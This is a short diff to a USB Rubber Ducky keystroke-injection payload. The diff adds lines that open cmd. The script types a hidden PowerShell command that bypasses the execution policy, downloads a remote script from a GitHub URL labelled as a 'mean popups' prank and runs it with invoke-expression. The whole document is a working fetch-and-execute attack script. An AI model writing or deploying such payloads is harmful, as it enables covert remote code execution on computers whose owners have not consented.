@@ -1,5 +1,9 @@
 GUI r
 DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/panguin6010/Rubber-ducky-payloads/main/Pranks/Mean%20Popups/mean-PopUps.ps1?dl=1; invoke-expression $pl
 DELAY 500
 ENTER
